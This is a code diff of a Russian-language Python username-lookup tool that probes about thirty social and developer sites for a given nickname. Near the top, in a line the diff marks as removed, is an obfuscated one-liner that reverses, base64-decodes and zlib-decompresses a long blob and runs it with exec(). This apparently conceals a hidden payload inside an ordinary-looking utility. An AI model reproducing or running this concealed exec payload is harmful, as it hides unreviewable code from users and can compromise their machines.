@@ -1,4 +1,114 @@
+import os
+import requests
+import time
+from colorama import Fore, init
 
+init()
 
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_art():
+    art = f"""
+{Fore.GREEN}
+  _   _ ____             ___      _       _   
+| | | / ___|           / _ \ ___(_)_ __ | |_ 
+| | | \___ \   _____  | | | / __| | '_ \| __|
+| |_| |___) | |_____| | |_| \__ \ | | | | |_ 
+ \___/|____/           \___/|___/_|_| |_|\__|       
+{Fore.RESET}
+    """
+    print(art)
+    print(f"{Fore.YELLOW}╔{'═' * 30}╗")
+    print(f"║ {'1. Поиск по нику':<28} ║")
+    print(f"║ {'2. Выход':<28} ║")
+    print(f"╚{'═' * 30}╝{Fore.RESET}")
+
+def check_username(nick):
+    sites = {
+        "VK": f"https://vk.com/{nick}",
+        "Facebook": f"https://facebook.com/{nick}",
+        "Instagram": f"https://instagram.com/{nick}",
+        "Twitter/X": f"https://x.com/{nick}",
+        "TikTok": f"https://tiktok.com/@{nick}",
+        "Snapchat": f"https://snapchat.com/add/{nick}",
+        "Threads": f"https://threads.net/@{nick}",
+        "Telegram": f"https://t.me/{nick}",
+        "Discord": f"https://discord.com/users/{nick}",
+        "Steam": f"https://steamcommunity.com/id/{nick}",
+        "Twitch": f"https://twitch.tv/{nick}",
+        "Epic Games": f"https://epicgames.com/account/personal?username={nick}",
+        "GitHub": f"https://github.com/{nick}",
+        "GitLab": f"https://gitlab.com/{nick}",
+        "Stack Overflow": f"https://stackoverflow.com/users/{nick}",
+        "Dev.to": f"https://dev.to/{nick}",
+        "Reddit": f"https://reddit.com/u/{nick}",
+        "Pinterest": f"https://pinterest.com/{nick}",
+        "Tumblr": f"https://{nick}.tumblr.com",
+        "Medium": f"https://medium.com/@{nick}",
+        "Quora": f"https://quora.com/profile/{nick}",
+        "YouTube": f"https://youtube.com/@{nick}",
+        "SoundCloud": f"https://soundcloud.com/{nick}",
+        "Spotify": f"https://open.spotify.com/user/{nick}",
+        "Last.fm": f"https://last.fm/user/{nick}",
+        "Patreon": f"https://patreon.com/{nick}",
+        "Flickr": f"https://flickr.com/people/{nick}",
+        "DeviantArt": f"https://{nick}.deviantart.com",
+        "Wikipedia": f"https://wikipedia.org/wiki/User:{nick}",
+        "Keybase": f"https://keybase.io/{nick}"
+    }
+
+    print(f"\n{Fore.YELLOW}🔍 Поиск аккаунтов для: {nick}{Fore.RESET}\n")
+
+    found = 0
+    total = len(sites)
+    
+    for name, url in sites.items():
+        try:
+            response = requests.get(url, timeout=5, allow_redirects=False)
+            if (response.status_code == 200 and 
+                not any(e in response.url.lower() for e in ["error", "404"])):
+                print(f"{Fore.GREEN}[+] {name}: {url}{Fore.RESET}")
+                found += 1
+            else:
+                print(f"{Fore.RED}[-] {name}: Не найдено{Fore.RESET}")
+        except:
+            print(f"{Fore.RED}[-] {name}: Ошибка проверки{Fore.RESET}")
+    
+    print(f"\n{Fore.YELLOW} Результаты:{Fore.RESET}")
+    print(f"{Fore.GREEN} Найдено: {found} аккаунтов{Fore.RESET}")
+    print(f"{Fore.RED} Не найдено: {total - found} аккаунтов{Fore.RESET}")
+    print(f"\n{Fore.CYAN} Пояснение:{Fore.RESET}")
+    print(f"{Fore.GREEN}Зелёный - аккаунт существует{Fore.RESET}")
+    print(f"{Fore.RED}Красный - аккаунт не найден{Fore.RESET}")
+
+def main():
+    try:
+        import requests
+    except ImportError:
+        print(f"{Fore.RED}[!] Устанавливаем requests...{Fore.RESET}")
+        os.system("pip install requests")
+        clear()
+
+    while True:
+        clear()
+        print_art()
+        choice = input("\nВыберите действие: ")
+
+        if choice == "1":
+            nick = input("Введите ник: ").strip()
+            if nick:
+                check_username(nick)
+                input("\nНажмите Enter чтобы продолжить...")
+            else:
+                print(f"{Fore.RED} Ник не может быть пустым!{Fore.RESET}")
+                time.sleep(1)
+        elif choice == "2":
+            print(f"{Fore.RED}Выход...{Fore.RESET}")
+            break
+        else:
+            print(f"{Fore.RED} Неверный выбор!{Fore.RESET}")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    main()
